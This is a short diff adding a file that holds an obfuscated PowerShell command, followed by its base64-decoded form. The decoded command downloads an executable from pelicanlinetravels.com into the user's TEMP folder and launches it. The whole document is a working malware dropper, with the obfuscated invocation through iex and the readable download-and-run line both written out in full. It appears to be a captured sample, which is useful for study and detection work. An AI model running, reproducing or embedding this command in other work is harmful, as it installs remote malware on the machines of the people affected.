@@ -1,0 +1,7 @@
+iex([SySTEm.tEXt.EnCodIng]::uTf8.GeTSTriNg([sYSTEm.ConVERT]::FRombase64stRInG('CihOZXctT2JqZWN0IHNZc1RlbS5uZXQud0VCY2xJRW5UKS5kT3duTE9hREZpTGUoJ2h0dHA6Ly93d3cucGVsaWNhbmxpbmV0cmF2ZWxzLmNvbS9pbWFnZXMveHZjYmt0eS5leGUnLCIkZU5WOlRFTVBceHZjYmt0eS5leGUiKTtTdGFydC1Qcm9jZXNzICgiJGVOVjpURU1QXHh2Y2JrdHkuZXhlIikKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sYsTem.net.wEBclIEnT).dOwnLOaDFiLe('http://www.pelicanlinetravels.com/images/xvcbkty.exe',"$eNV:TEMP\xvcbkty.exe");Start-Process ("$eNV:TEMP\xvcbkty.exe")
+
